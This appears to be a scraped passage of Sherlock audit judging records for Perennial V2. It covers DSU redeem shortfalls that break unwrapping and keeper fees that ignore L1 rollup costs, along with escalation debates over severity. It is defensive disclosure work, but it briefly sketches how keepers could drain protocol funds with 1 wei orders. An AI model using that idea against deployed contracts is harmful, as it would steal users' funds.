\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L289\nthe transaction would revert because the contract would not have enough USDC in the contract, making `_vaultUpdate`, `_update` with `warp` to true on `_withdraw` reverting all the time and `_liquidate` reverting 100% of the time. Since the protocol stated that they want to be aware of any issue that might arise with the integration of DSU\n![image](https://github.com/sherlock-audit/2023-07-perennial-VagnerAndrei26/assets/111457602/e177a5ee-082c-472c-9ace-d623d0f22887)\nI decided to specify this issue which could happen can cause a lot of damage to the users.\n## Impact\nImpact is a high one since it will cause the liquidation process to fail and also withdrawing funds to fail.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L285-L289\n## Tool used\n\nManual Review\n\n## Recommendation\nSince the contract doesn't store any USDC, you could transfer the whole balance of the contract every time after you call `redeem` or do balance before and balance after, and transfer the difference. It is important to take special care when you implement other protocols since any failures will also break your protocol.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n3 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> l\n\n**n33k** commented:\n> low\n\n**panprog** commented:\n> medium because the situation is very unlikely\n\n\n\n**VagnerAndrei26**\n\nEscalate : \nI believe this issue to be valid and at least a valid medium under the considerations of Sherlock rules which states \n![image](https://github.com/sherlock-audit/2023-07-perennial-judging/assets/111457602/a587a728-aeee-4713-947a-574a0aa024b8)\nsince the external protocol the Perennial team is working, DSU,  is not controlled by the them and since they specified in the ReadMe that they want to know any issues that might arise because of DSU integration, \n![image](https://github.com/sherlock-audit/2023-07-perennial-judging/assets/111457602/78fde759-cde2-4ca5-ab76-9f8c561ebb55)\nwhich I provided in the report. The way the code is written right now might arise problems in case where DSU fails/ becomes insolvent and it can be solved pretty easily in the solution I provided, so considering all of this, this issue should be evaluated at least as a Medium since the impact is a high one, by blocking the whole liquidation process and withdrawing with wrap, and probability of happening can be low.\n\n**sherlock-admin2**\n\n > Escalate : \n> I believe this issue to be valid and at least a valid medium under the considerations of Sherlock rules which states \n> ![image](https://github.com/sherlock-audit/2023-07-perennial-judging/assets/111457602/a587a728-aeee-4713-947a-574a0aa024b8)\n> since the external protocol the Perennial team is working, DSU,  is not controlled by the them and since they specified in the ReadMe that they want to know any issues that might arise because of DSU integration, \n> ![image](https://github.com/sherlock-audit/2023-07-perennial-judging/assets/111457602/78fde759-cde2-4ca5-ab76-9f8c561ebb55)\n> which I provided in the report. The way the code is written right now might arise problems in case where DSU fails/ becomes insolvent and it can be solved pretty easily in the solution I provided, so considering all of this, this issue should be evaluated at least as a Medium since the impact is a high one, by blocking the whole liquidation process and withdrawing with wrap, and probability of happening can be low.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**141345**\n\nThe condition is \n> if it is not set up in the constructor, or if the balanceOf USDC of batcher is less than the amount intended to withdraw\n\nBut at first place, USDC is wrapped into DSU by batcher.\n```solidity\nFile: perennial-v2\\packages\\perennial-extensions\\contracts\\MultiInvoker.sol\n271:     function _wrap(address receiver, UFixed18 amount) internal {\n\n277:             // Wrap the USDC into DSU and return to the receiver\n278:             batcher.wrap(amount, receiver);\n```\n\nSo the USDC in batcher is expected to be fully backed.\n\nHence low/info severity is more appropriate.\n\n**VagnerAndrei26**\n\n> The condition is\n> \n> > if it is not set up in the constructor, or if the balanceOf USDC of batcher is less than the amount intended to withdraw\n> \n> But at first place, USDC is wrapped into DSU by batcher.\n> \n> ```solidity\n> File: perennial-v2\\packages\\perennial-extensions\\contracts\\MultiInvoker.sol\n> 271:     function _wrap(address receiver, UFixed18 amount) internal {\n> \n> 277:             // Wrap the USDC into DSU and return to the receiver\n> 278:             batcher.wrap(amount, receiver);\n> ```\n> \n> So the USDC in batcher is expected to be fully backed.\n> \n> Hence low/info severity is more appropriate.\n\nYes that is true, but that is not the issue that I'm talking about here, I'm not saying that there will not be enough funds in the batcher to be paid back. The issue that I've talked here is the fact that DSU protocol can borrow DSU, which will increase the debt of the protocol, as can be seen here \nhttps://github.com/emptysetsquad/emptyset/blob/c5d876fbd8ff1fac988898b77ef5461971f9fdd2/protocol/contracts/src/reserve/ReserveComptroller.sol#L143-L150\nin that case, when the `redeem` will be called and the redeem amount is calculated `redeemPrice` which is used in the calculation can be less than one \nhttps://github.com/emptysetsquad/emptyset/blob/c5d876fbd8ff1fac988898b77ef5461971f9fdd2/protocol/contracts/src/reserve/ReserveComptroller.sol#L93-L95\n, since the DSU protocol is in debt and redeeming will not be done 1-1, less USDC will be transferred to the `MultiInvoker.sol` than the `amount` specified in redeem. Because of that trying to push exactly the specific `amount` used in redeem, will fail and revert, because the contract will not have enough funds. That's why I specified that transferring the whole `balanceOf(address(this))` would solve this issue of blocking liquidation and withdrawing, since the contract doesn't hold any funds and just act as a middle man. So this is a risk associated with the DSU integration that can mess important functionalities of Perennial and also block funds.\n\n**141345**\n\nSorry I misunderstood the report.\n\nThe DSU reserve has borrow function result in debt, and the redeem amount will not be enough. Or we can say it is when DSU depeg from USDC.\n\nSeems an edge case issue.\n\n**VagnerAndrei26**\n\n> Sorry I misunderstood the report.\n> \n> The DSU reserve has borrow function result in debt, and the redeem amount will not be enough. Or we can say it is when DSU depeg from USDC.\n> \n> Seems an edge case issue.\n\nYep, it is an edge case, that's why in my escalation I specify that should be treated at least as a medium, since the damage exist and can be quite high and as for probability, it depends a lot on how DSU maintain their balance sheets, since the function can be called anytime by the owners, and since it was specify that Perennial team wants to know integration issue that could occur with DSU, it is in their advantage to protect their protocol against this case.\n\n**hrishibhat**\n\n@arjun-io \n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nConsidering this issue a valid medium given the edge case\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [VagnerAndrei26](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/22/#issuecomment-1695623816): accepted",
      "summary": "\nThis bug report concerns an issue found in the `MultiInvoker.sol` contract, which is part of the Perennial Protocol. The issue is that the `_unwrap` function can cause the users to be unable to `_liquidate` or `_withdraw` with `warp` set to true. This is because the `_withdraw` function makes some wrong assumptions which could lead to reverts all the time if the DSU protocol is in debt. \n\nThe issue is that `_unwrap` will check if the address of `batcher` is 0, which can be the case if it is not set up in the constructor, or if the `balanceOf`  USDC of `batcher` is less than the amount intended to withdraw. If either of these conditions are true, `_unwrap` will try to call the `redeem` function on `reserve` with the intended amount and then transfers the `amount` to the `receiver`. The problem is that the protocol assumes that the `amount` used in `redeem` will always be equal to the `amount` of USDC returned, which is not the case. \n\nThe `redeemAmount` is a calculation that depends on the `redeemPrice` which depends on the debt of the protocol. The whole calculation of `redeemPrice` is done depending on the `reserveRatio` of the Protocol, so in the case where DSU is in debt, the `redeemAmount` calculated will be less than the actual amount inserted into `redeem` function, and that `redeemAmount` will be the one actual transferred to the `MultiInvoker.sol`. When `_unwrap` will try to transfers the same amount of USDC, the transaction would revert because the contract would not have enough USDC in the contract, making `_vaultUpdate`, `_update` with `warp` to true on `_withdraw` reverting all the time and `_liquidate` reverting 100% of the time. \n\nThe impact of this issue is high since it will cause the liquidation process to fail and also withdrawing funds to fail. The code snippet for this issue can be found at https://github.com/sherlock-audit/2023-07-perennial/blob/main/peren",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/22",
      "tags": [],
      "finders": [
        "Vagner"
      ]
    },
    {
      "id": "24304",
      "title": "H-6: Keepers will suffer significant losses due to miss compensation for L1 rollup fees",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/91 \n\n## Found by \nKingNFT\nWhile keepers submits transactions to L2 EVM chains, they need to pay both L2 execution fee and L1 rollup fee. Actually, L1 fees are much higher than L2 fees. In many case, L2 fees can be practically negligible. The current implementation only compensate and incentive keepers based on L2 gas consumption, keepers will suffer significant losses.\n\n## Vulnerability Detail\nAs shown of ````keep()```` modifier (L40-57), only L2  execution fee are compensated.\n```solidity\nFile: perennial-v2\\packages\\perennial-oracle\\contracts\\pyth\\PythOracle.sol\n124:     function commitRequested(uint256 versionIndex, bytes calldata updateData)\n125:         public\n126:         payable\n127:         keep(KEEPER_REWARD_PREMIUM, KEEPER_BUFFER, \"\")\n128:     {\n...\n157:     }\n\nFile: perennial-v2\\packages\\perennial-extensions\\contracts\\MultiInvoker.sol\n359:     function _executeOrder(\n360:         address account,\n361:         IMarket market,\n362:         uint256 nonce\n363:     ) internal keep (\n364:         UFixed18Lib.from(keeperMultiplier),\n365:         GAS_BUFFER,\n366:         abi.encode(account, market, orders(account, market, nonce).fee)\n367:     ) {\n...\n384:     }\n\n\nFile: root\\contracts\\attribute\\Kept.sol\n40:     modifier keep(UFixed18 multiplier, uint256 buffer, bytes memory data) {\n41:         uint256 startGas = gasleft();\n42: \n43:         _;\n44: \n45:         uint256 gasUsed = startGas - gasleft();\n46:         UFixed18 keeperFee = UFixed18Lib.from(gasUsed)\n47:             .mul(multiplier)\n48:             .add(UFixed18Lib.from(buffer))\n49:             .mul(_etherPrice())\n50:             .mul(UFixed18.wrap(block.basefee));\n51: \n52:         _raiseKeeperFee(keeperFee, data);\n53: \n54:         keeperToken().push(msg.sender, keeperFee);\n55: \n56:         emit KeeperCall(msg.sender, gasUsed, multiplier, buffer, keeperFee);\n57:     }\n\n```\n\nTakes a random selected transaction at the writing time\nhttps://optimistic.etherscan.io/tx/0xbb8e68e21c92acf4171fb6041b758b55acc3c559ec4595ed1129d534d90de995\n\nWe can find the L1 fee is much expensive than L2 fee.\n```solidity\nL2 fee = 0.06 Gwei * 113,449 ~= 6,806 Gwei\nL1 fee = 0.00006565634612417 ETH ~= 65656 Gwei\nL1 / L2 = 964%\n```\n\nTypically, L1 fees are dynamic and determined by the calldata length and smoothed Ethereum gas prices. To submit Pyth oracle price, the ````VAA```` calldata will be 1700+ bytes, keepers need to pay much L1 rollup fee.\n\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/test/integration/pyth/PythOracle.test.ts#L34\n\n## Impact\nNo enough incentive for keeper to submit oracle price and execute orders, the system will not work.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/root/contracts/attribute/Kept.sol#L40\n\n## Tool used\n\nManual Review\n\n## Recommendation\nCompensating  L1 rollup fee, here are some reference:\nhttps://docs.arbitrum.io/arbos/l1-pricing\nhttps://community.optimism.io/docs/developers/build/transaction-fees/#the-l1-data-fee\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> m\n\n\n\n**arjun-io**\n\nThe `Kept` helper supports a buffer amount which can be used for this use case.\n\n**ydspa**\n\nEscalate\n\nUsing ````Kept```` buffer can't solve this problem, as the ratio of ````L1GasPrice / L2GasPrice```` changes in every block and can vary with a extreme wide range.\nLet's say \n```solidity\nCurrentL1GasPrice = 20 Gwei // it refers to smoothed recent Ethereum gas price provided by L2 system contract\nCurretnL2GasPrice = 2 Gwei   // it refers to block.basefee\nL1RollupGas = 40,000\nL1RollupFee = L1RollupGas * CurrentL1GasPrice  = 40,000 * 20 = 800,000 Gwei\n```\nTo compensate L1 rollup fee, we should set\n```solidity\nbuffer = L1RollupFee / CurrentL2GasPrice = 800,000 / 2 = 400,000\n```\nto make \n```solidity\nL1Compensation = buffer *  CurrentL2GasPrice = 400,000 * 2 = 800,000 = L1RollupFee \n```\n\nsome time later, i.e. 1 hour, gas prices change to\n```solidity\nNewL1GasPrice = 40 Gwei\nNewL2GasPrice = 0.01 Gwei \n```\nwe can see the ````L1Compensation```` will be far less than ````L1RollupFee````, keepers suffer losses\n```solidity\nL1RollupFee = L1RollupGas * CurrentL1GasPrice = 40, 000 * 40 = 1,600,000 Gwei\nL1Compensation = buffer * CurretnL2GasPrice = 400, 000 * 0.01 = 4,000 Gwei\n```\nIn contrast, if gas prices change to\n```solidity\nNewL1GasPrice = 10 Gwei\nNewL2GasPrice = 2 Gwei\n```\nthen, the ````L1Compensation```` is larger than ````L1RollupFee````, keepers earn extra profit.\n```solidity\nL1RollupFee = L1RollupGas * CurrentL1GasPrice = 40,000 * 10 = 400,000 Gwei\nL1Compensation= buffer * CurretnL2GasPrice = 400,000 * 2 = 800,000 Gwei\n```\n\nTherefore, regardless of how we set ````buffer````, as it's a fixed value, sometimes keepers suffer losses, and other times keepers earn extra profit.\n\nDuring periods that keepers suffer losses, they are likely to stop working and  the system is blocked.\nAnd other periods , the protocol suffer losses.\n\nAbout the severity:\n(1) As the users' orders will be held until keepers become profitable, the waiting time may be short as some minutes, may be long as some hours, or even some days. Users' financial losses are foreseeable.\n(2) while keepers earn extra profit, proper ratio of ````L1GasPrice / L2GasPrice```` and ````block.basefee```` could make ````keeperReward > settlementFee````, then a new attack vector become feasible，keepers can set ````1 wei```` orders by self to drain fund from protocol, as ````self.fee ~= 0, profit ~= keeperReward  - self.keeper = keeperReward  - settlementFee````\n```solidity\nFile: perennial-v2\\packages\\perennial\\contracts\\types\\Order.sol\n50:     function registerFee(\n51:         Order memory self,\n52:         OracleVersion memory latestVersion,\n53:         MarketParameter memory marketParameter,\n54:         RiskParameter memory riskParameter\n55:     ) internal pure {\n...\n64:         self.fee = self.maker.abs().mul(latestVersion.price.abs()).mul(UFixed6Lib.from(makerFee))\n65:             .add(self.long.abs().add(self.short.abs()).mul(latestVersion.price.abs()).mul(UFixed6Lib.from(takerFee)));\n66: \n67:         self.keeper = isEmpty(self) ? UFixed6Lib.ZERO : marketParameter.settlementFee;\n68:     }\n\n```\n\nTo sum up, I think it's high, not medium\n\n\n\n\n\n\n**sherlock-admin2**\n\n > Escalate\n> \n> Using ````Kept```` buffer can't solve this problem, as the ratio of ````L1GasPrice / L2GasPrice```` changes in every block and can vary with a extreme wide range.\n> Let's say \n> ```solidity\n> CurrentL1GasPrice = 20 Gwei // it refers to smoothed recent Ethereum gas price provided by L2 system contract\n> CurretnL2GasPrice = 2 Gwei   // it refers to block.basefee\n> L1RollupGas = 40,000\n> L1RollupFee = L1RollupGas * CurrentL1GasPrice  = 40,000 * 20 = 800,000 Gwei\n> ```\n> To compensate L1 rollup fee, we should set\n> ```solidity\n> buffer = L1RollupFee / CurrentL2GasPrice = 800,000 / 2 = 400,000\n> ```\n> to make \n> ```solidity\n> L1Compensation = buffer *  CurrentL2GasPrice = 400,000 * 2 = 800,000 = L1RollupFee \n> ```\n> \n> some time later, i.e. 1 hour, gas prices change to\n> ```solidity\n> NewL1GasPrice = 40 Gwei\n> NewL2GasPrice = 0.01 Gwei \n> ```\n> we can see the ````L1Compensation```` will be far less than ````L1RollupFee````, keepers suffer losses\n> ```solidity\n> L1RollupFee = L1RollupGas * CurrentL1GasPrice = 40, 000 * 40 = 1,600,000 Gwei\n> L1Compensation = buffer * CurretnL2GasPrice = 400, 000 * 0.01 = 4,000 Gwei\n> ```\n> In contrast, if gas prices change to\n> ```solidity\n> NewL1GasPrice = 10 Gwei\n> NewL2GasPrice = 2 Gwei\n> ```\n> then, the ````L1Compensation```` is larger than ````L1RollupFee````, keepers earn extra profit.\n> ```solidity\n> L1RollupFee = L1RollupGas * CurrentL1GasPrice = 40,000 * 10 = 400,000 Gwei\n> L1Compensation= buffer * CurretnL2GasPrice = 400,000 * 2 = 800,000 Gwei\n> ```\n> \n> Therefore, regardless of how we set ````buffer````, as it's a fixed value, sometimes keepers suffer losses, and other times keepers earn extra profit.\n> \n> During periods that keepers suffer losses, they are likely to stop working and  the system is blocked.\n> And other periods , the protocol suffer losses.\n> \n> About the severity:\n> (1) As the users' orders will be held until keepers become profitable, the waiting time may be short as some minutes, may be long as some hours, or even some days. Users' financial losses are foreseeable.\n> (2) while keepers earn extra profit, proper ratio of ````L1GasPrice / L2GasPrice```` and ````block.basefee```` could make ````keeperReward > settlementFee````, then a new attack vector become feasible，keepers can set ````1 wei```` orders by self to drain fund from protocol, as ````self.fee ~= 0, profit ~= keeperReward  - self.keeper = keeperReward  - settlementFee````\n> ```solidity\n> File: perennial-v2\\packages\\perennial\\contracts\\types\\Order.sol\n> 50:     function registerFee(\n> 51:         Order memory self,\n> 52:         OracleVersion memory latestVersion,\n> 53:         MarketParameter memory marketParameter,\n> 54:         RiskParameter memory riskParameter\n> 55:     ) internal pure {\n> ...\n> 64:         self.fee = self.maker.abs().mul(latestVersion.price.abs()).mul(UFixed6Lib.from(makerFee))\n> 65:             .add(self.long.abs().add(self.short.abs()).mul(latestVersion.price.abs()).mul(UFixed6Lib.from(takerFee)));\n> 66: \n> 67:         self.keeper = isEmpty(self) ? UFixed6Lib.ZERO : marketParameter.settlementFee;\n> 68:     }\n> \n> ```\n> \n> To sum up, I think it's high, not medium\n> \n> \n> \n> \n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**arjun-io**\n\nThanks for the thorough explanation on why a buffer won't work. We agree that we should modify the Kept function to estimate L1 gas costs, thanks for the report!\n\n**141345**\n\nThe severity of medium seems more appropriate.\n\nBecause according to sherlock's HM [criteria](https://docs.sherlock.xyz/audits/judging/judging):\n\n> Medium: \n> viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.\n> The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future.\n> \n> High: \n> This vulnerability would result in a material loss of funds, and the cost of the attack is low.\n\nHere the imbalanced L1/L2 gas fee would not be too frequent. Most of the time, the buffer will be good to compensate for the keeper. The described loss will incur when all the special conditions are met, and the fixed buffer is not enough to cover the keeper's cost. \n\n\n**arjun-io**\n\nFixed\nUpdate Kept for L2s: https://github.com/equilibria-xyz/root/pull/74 and https://github.com/equilibria-xyz/root/pull/76\nUpdate Pyth Oracle for L2: https://github.com/equilibria-xyz/perennial-v2/pull/85\n\n**hrishibhat**\n\n@ydspa tend to agree with this comment:\nhttps://github.com/sherlock-audit/2023-07-perennial-judging/issues/91#issuecomment-1697458799\nA valid medium\n\n**ydspa**\n\n> @ydspa tend to agree with this comment: [#91 (comment)](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/91#issuecomment-1697458799) A valid medium\n\nI think the conclusion of ````Here the imbalanced L1/L2 gas fee would not be too frequent```` is not correct, the ratio of ````L1GasPrice / L2GasPrice```` vary frequently in a very wide range. The following table shows 3 typical ````2-hours```` range of ````Ethereum VS Optimistic```` gas price in the past two weeks. We can see the ````Ratio```` can vary from ````e1```` to as large as ````e9````.\n\n| DateTime         | L1GasPrice  | L2GasPrice(Base) | Ratio(L1/L2) | Link                                                                                                          |\n|------------------|-------------|------------------|--------------|---------------------------------------------------------------------------------------------------------------|\n| 2023-08-27 02:00 | 13.19 Gwei  | 55 wei           | 2.40e8       | [link](https://optimistic.etherscan.io/tx/0x94c22266f7bed99aaf56d59bb5c85d5df407093bb4019afcface0f4ae3e077d0) |\n| 2023-08-27 02:30 | 16.20 Gwei  | 56 wei           | 2.30e8       | [link](https://optimistic.etherscan.io/tx/0xb785f2e3b5afeb27192bb29194ba5a254f612259bcc70762e70c0719b0bd4d22) |\n| 2023-08-27 03:00 | 14.95 Gwei  | 58 wei           | 2.58e8       | [link](https://optimistic.etherscan.io/tx/0x04ee0e14e6c5668cee166a1751078e52adbf02d0e0b73888f44bb4b1f227676d) |\n| 2023-08-27 03:30 | 15.55 Gwei  | 53 wei           | 2.93e8       | [link](https://optimistic.etherscan.io/tx/0xb120d5e8ba8c8db5c961b6537bdd8250662f60672124c52384351011ae3cab63) |\n| 2023-08-27 04:00 | 21.53 Gwei  | 51 wei           | 4.06e8       | [link](https://optimistic.etherscan.io/tx/0x1831b4ad38f9115da5baebe4592362098d50c7eefc6d3383dfc3d59da972e55e) |\n|                  |             |                  |              |                                                                                                               |\n|                  |             |                  |              |                                                                                                               |\n| 2023-08-22 02:00 | 46.41 Gwei  | 66 wei           | 0.7e9        | [link](https://optimistic.etherscan.io/tx/0x9c87ef7883b884e242d33d169b115638dea368ed7af78e7ab507f339e1b30b08) |\n| 2023-08-22 02:30 | 121.65 Gwei | 53 wei           | 2.30e9       | [link](https://optimistic.etherscan.io/tx/0x11b822ff0d6f5af9cac86be3c1a840e264312ec32c7e23135dfdb063685ee385) |\n| 2023-08-22 03:00 | 89.76 Gwei  | 52 wei           | 1.73e9       | [link](https://optimistic.etherscan.io/tx/0xbf67f40586cf3a96a4ff2d91d6b845206d4e896c87b015a2a4c76f636894a8f9) |\n| 2023-08-22 03:30 | 68.45 Gwei  | 51 wei           | 1.34e9       | [link](https://optimistic.etherscan.io/tx/0xc497778722064404a4cc4c97477af8b8de407cc39e5234714c2b6fc57bc49d39) |\n| 2023-08-22 04:00 | 42.59 Gwei  | 100 wei          | 0.43e9       | [link](https://optimistic.etherscan.io/tx/0xe8f04f5fd0b8056fee402238c0c65124123c195fb3fa03930e9e0037c03ffccc) |\n|                  |             |                  |              |                                                                                                               |\n|                  |             |                  |              |                                                                                                               |\n| 2023-08-17 10:00 | 229.22 Gwei | 3.36 Gwei        | 6.82e1       | [link](https://optimistic.etherscan.io/tx/0xd1e8e288dc216bb620797152bd70d5d1d7b75687f12981f394442d7b5c18951b) |\n| 2023-08-17 10:30 | 121.38 Gwei | 0.30 Gwei        | 4.05e2       | [link](https://optimistic.etherscan.io/tx/0x83f8f13109bf06f7be67c22988aa4018ff19e6e517d723019672b724be4c112a) |\n| 2023-08-17 11:00 | 138.89 Gwei | 1.64 Gwei        | 8.47e1       | [link](https://optimistic.etherscan.io/tx/0x496658d5f8952e8fbfb87296458258bf13e6a3b3aaae3b0ad84754b31a21f767) |\n| 2023-08-17 11:30 | 61.60 Gwei  | 0.1 Gwei         | 6.16e2       | [link](https://optimistic.etherscan.io/tx/0x733babe7bceb4dbaaed6e3ef0acd8d9b0628d6c93365996a111fe0192042d4a0) |\n| 2023-08-17 12:00 | 36.84 Gwei  | 0.0058 Gwei      | 6.35e3       | [link](https://optimistic.etherscan.io/tx/0x7eface13f838d72a43d807b97bbd444bbe71bba75ef8dcc061ec5bff27cd3d30) |\n|                  |             |                  |              |                                                                                                               |\n\nIt will cause users' orders been held up to some hours in 2 ways:\nLet's say we set ````buffer```` according ````Ratio = 2e8```` and plus up to ````100%```` intended reward for keepers, which means the system can only work well while ````Ratio```` is during ````(2e8, 4e8)````.\nSo, in ````2023-08-27 02:00 ~ 04:00```` the system works, but in most cases, the system doesn't work such as\n(1) in ````2023-08-22 02:00 ~ 04:00````, the ````Ratio```` is too high, keepers would suffer loss which might lead them to stop pushing price and users' orders are held.\n(2) in ````2023-08-17 10:00 ~ 12:00````, the ````Ratio```` is too low, keepers earn too much reward, which will trigger the following protection, then no new price can be pushed to chain, all users' orders are held entirely.\n```solidity\nFile: packages\\perennial-oracle\\contracts\\OracleFactory.sol\n93:     function claim(UFixed6 amount) external {\n94:         if (amount.gt(maxClaim)) revert OracleFactoryClaimTooLargeError();\n...\n97:     }\n\n```\n\nTo be emphasized:\n1. Regardless of how we set ````buffer````, it can only work in a extreme narrow ````Ratio```` range as compared to ````(e1, e9)````.\n2. Just in the past 2 weeks, we can easily find more examples like the above ones that would block users' orders for up to 2 hours. It's almost ````100%```` sure this bug would be repeatedly triggered during the long lifetime of the protocol.\n3. As a perpetual exchange APP, users' orders are held up to some hours, especially in the above ````case (2)````, the service is stopped entirely, users' financial losses are foreseeable, the impact is high. \n\nHence, the issue is with both ````high```` probability of occurrence and ````high```` impact, undoubtedly should be a ````high```` issue.\n\n**141345**\n\nYes the fee ratio could vary across a wide span. Extreme high L1 gas fee is intermittent, and will repeat.\nHowever, the protocol can set some fix buffer at 90% percentile of the L1/L2 fee ratio (maybe at e8 level), then the loss will only emerge in some certain scenarios.\n\nStill seems medium due to conditional loss.\n\n**ydspa**\n\n> Yes the fee ratio could vary across a wide span. Extreme high L1 gas fee is intermittent, and will repeat. However, the protocol can set some fix buffer at 90% percentile of the L1/L2 fee ratio (maybe at e8 level), then the loss will only emerge in some certain scenarios.\n> \n> Still seems medium due to conditional loss.\n\n(1）I'm convinced that you can't find a ````buffer```` that works at 90% percentile, it is even hard to work at 50%, you can set buffer with a fixed Ratio plus some intended reward such as 100% (in perennial testcase, it's only 50%), then verify data in the past 1 year\n\n(2) conditional loss of ````1 %```` probability  VS ````99%```` probability are not the same thing, i think the later should be treated as ````unconditional ````.\n\n\n\n\n**141345**\n\nEven the distribution is Pareto distribution (power law), percentile still works. 50%, 90% can be found.\n\n**ydspa**\n\n> Even the distribution is Pareto distribution (power law), percentile still works. 50%, 90% can be found.\n\nGive your specific parameters please\n\n**141345**\n\n> you can't find a `buffer` that works at 90% percentile, it is even hard to work at 50%\n\npercentile always can be found, such as medium number(50%).\n\nOn the opposite, mean value could be hard to find, those extreme high gas fee can make mean not converge.\n\n\n\n\n**ydspa**\n\nMore proof: if we set buffer according ````e8```` level as recommended above, then we can find lots of examples the actual ````Ratio```` falls below ````e6```` which keepers would earn too much rewards (10,000% level) to trigger system protection to block price submission.\n\nThe instances are all from the past one month, and sample interval is 1 hour, that's mean, averagely speaking, the system will be blocked for about 127 hours (5+ days) in one month if we set buffer according ````e8```` level.\n```solidity\nindex  blockHeight\n0 108995426\n1 108952226\n2 108865826\n3 108864026\n4 108862226\n5 108860426\n6 108822626\n7 108820826\n8 108819026\n9 108817226\n10 108815426\n11 108813626\n12 108811826\n13 108810026\n14 108808226\n15 108806426\n16 108804626\n17 108802826\n18 108801026\n19 108799226\n20 108604826\n21 108570626\n22 108504026\n23 108471626\n24 108376226\n25 108360026\n26 108358226\n27 108356426\n28 108345626\n29 108318626\n30 108311426\n31 108309626\n32 108298826\n33 108297026\n34 108295226\n35 108293426\n36 108291626\n37 108289826\n38 108288026\n39 108286226\n40 108284426\n41 108268226\n42 108266426\n43 108264626\n44 108262826\n45 108261026\n46 108259226\n47 108257426\n48 108255626\n49 108253826\n50 108252026\n51 108250226\n52 108248426\n53 108246626\n54 108244826\n55 108243026\n56 108241226\n57 108239426\n58 108237626\n59 108235826\n60 108234026\n61 108232226\n62 108230426\n63 108223226\n64 108221426\n65 108219626\n66 108217826\n67 108216026\n68 108214226\n69 108212426\n70 108210626\n71 108208826\n72 108207026\n73 108205226\n74 108203426\n75 108201626\n76 108079226\n77 107958626\n78 107953226\n79 107951426\n80 107949626\n81 107947826\n82 107946026\n83 107944226\n84 107942426\n85 107940626\n86 107938826\n87 107937026\n88 107935226\n89 107933426\n90 107931626\n91 107929826\n92 107928026\n93 107926226\n94 107924426\n95 107922626\n96 107920826\n97 107919026\n98 107917226\n99 107915426\n100 107913626\n101 107911826\n102 107910026\n103 107908226\n104 107906426\n105 107904626\n106 107902826\n107 107901026\n108 107870426\n109 107780426\n110 107778626\n111 107776826\n112 107775026\n113 107773226\n114 107771426\n115 107769626\n116 107767826\n117 107742626\n118 107740826\n119 107739026\n120 107737226\n121 107735426\n122 107733626\n123 107731826\n124 107730026\n125 107728226\n126 107726426\n```\n\n\n**141345**\n\nThe main point is, there is some parameter, considering the trade off, can balance the loss and overpayment. e8 is just an example. \n\n\n\n**ydspa**\n\n> The main point is, there is some parameter, considering the trade off, can balance the loss and overpayment. e8 is just an example.\n\nWhat my meaning is the parameter doesn't exist at all, mathematically speaking, ````L1Price```` and ````L2Price```` are ````enough independent````, we can't calculate the following result by only ````L2Price````\n```solidity\nOptimism Transaction Fee = [ Fee Scalar * L1 Gas Price * (Calldata + Fixed Overhead) ] + [ L2 Gas Price * L2 Gas Used ]\n```\nreference: https://dune.com/haddis3/optimism-fee-calculator\n\nThis is why no matter we set ````buffer```` according ````e1````, ````e2````, ..., ````e9```` or any other value, the issue would be repeatedly triggered. So, actually it's a ````unconditional```` issue.\n\n**ydspa**\n\n> > you can't find a `buffer` that works at 90% percentile, it is even hard to work at 50%\n> \n> percentile always can be found, such as medium number(50%).\n> \n> On the opposite, mean value could be hard to find, those extreme high gas fee can make mean not converge.\n\nHere is a mistake in thoughts,  set ````buffer```` according the number of 90% percentile, not means the setting will work from 0% percentile to 90% percentile, actually it might only work for ````(85%, 95%)````.\n\n\n\n**141345**\n\n0.001, 0.02, 0.3, 4, 5, 6, 7, 8, 9, 10000.\n\nFor this skewed distribution, 90% percentile is 9.\nWhy only work for around 9?\n\n**ydspa**\n\n> 0.001, 0.02, 0.3, 4, 5, 6, 7, 8, 9, 10000.\n> \n> For this skewed distribution, 90% percentile is 9. Why only work for around 9?\nLet's say, at ````e9````, keeper get $1, then at ````e8```` it becomes $10, at ````e7```` it would be $100...\n\n\n\n**141345**\n\n> repeatedly triggered\n\nMy understanding, something like, it could be triggered 10-20% of the time in a certain time span, such as 1 month, 1 week. \n\nIt still falls into the category with condition:\nPer [criteria](https://docs.sherlock.xyz/audits/judging/judging)\n> The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future.\n\n\n\n**ydspa**\n\n> \n\nMy understanding about the probability of issue occurrence, which i learned when i work for other audit firms, are like this:\n\nIf the issue will occur even ````once```` with ````high probability````  in a reasonable period such as 3 months, then it's high probability.\n\nIt's far away from the thought that only if a issue will keep occurring in most the time, let's say, in 2 of the 3 months, then it's high probability.\n\nSo, in my opinion, if a issue might occur hundred times a month, it's obviously a ````high probability````. And with ````high probability```` and ````high impact```` issue, we mark it as ````high````.\n\n**Actually, we can think the situation much more simple:**\n\n````If an exchange's service would be suspended randomly sum up to average 7 days per month, is it critical, 